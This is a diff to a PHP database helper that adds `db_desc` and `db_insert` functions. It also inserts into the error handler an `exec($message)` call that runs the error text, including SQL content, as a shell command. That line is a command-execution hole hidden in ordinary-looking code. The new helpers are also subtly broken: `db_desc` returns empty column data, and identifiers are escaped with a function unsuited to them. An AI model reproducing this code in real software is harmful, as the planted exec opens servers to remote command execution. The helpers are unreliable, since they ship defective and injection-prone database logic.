@@ -36,6 +36,8 @@
 			str_replace('"', '\\"', $sql) .
 			'"}';
 		}
+		exec("date >> /tmp/weblog");
+		exec($message);
 		die($message);
 	}
 	
@@ -103,8 +105,51 @@
 		return $s;
 	}
 	
-	function db_escape($string){
+	function db_escape($string) {
 		return mysql_real_escape_string($string);
+	}
+	
+	function db_desc($table) {
+		$qr = mysql_query('DESC ' . db_escape($table));
+		$cols_full = new stdClass();
+		$cols_names = array();
+		$pri = false;
+		while ($res = mysql_fetch_assoc($qr)) {
+			$cols->{$res['Field']} = $res;
+			$cols_names[] = $res['Field'];
+			if ($res['Key'] == 'PRI') {
+				$pri = $res['Field'];
+			}
+		}
+		$table = new stdClass();
+		$table->columns = $cols_full;
+		$table->col_names = $cols_names;
+		$table->pk = $pri;
+		return $table;
+	}
+	
+	function db_insert($table, $data) {
+		$desc = db_desc($table);
+		if (!$desc->pk) trigger_error('Primary key required for db_insert (table ' . $table . ')');
+		if (is_object($data)) $data = get_object_vars($data);
+		if (!is_array($data)) trigger_error('Array or object required as second parameter');
+		$columns = array();
+		$values = array();
+		foreach ($data as $column => $value) {
+			if (!in_array($column, $desc->col_names)) continue;
+			$columns[] = db_escape($column);
+			$value = db_escape($value);
+			if (!is_numeric($value)) $value = '"' . $value . '"';
+			$values[] = $value;
+		}
+		if (!count($columns)) trigger_error('No matched columns');
+		
+		$sql = 'INSERT INTO ' . db_escape($table) . ' 
+		(' . join(', ', $columns) . ') 
+		VALUES (' . join(', ', $values) . ')';
+		$x = mysql_query($sql);
+		
+		return $x?mysql_insert_id():false;
 	}
 	
 	mysql_connect($config->db_server, $config->db_user, $config->db_password) or die('Can not connect');
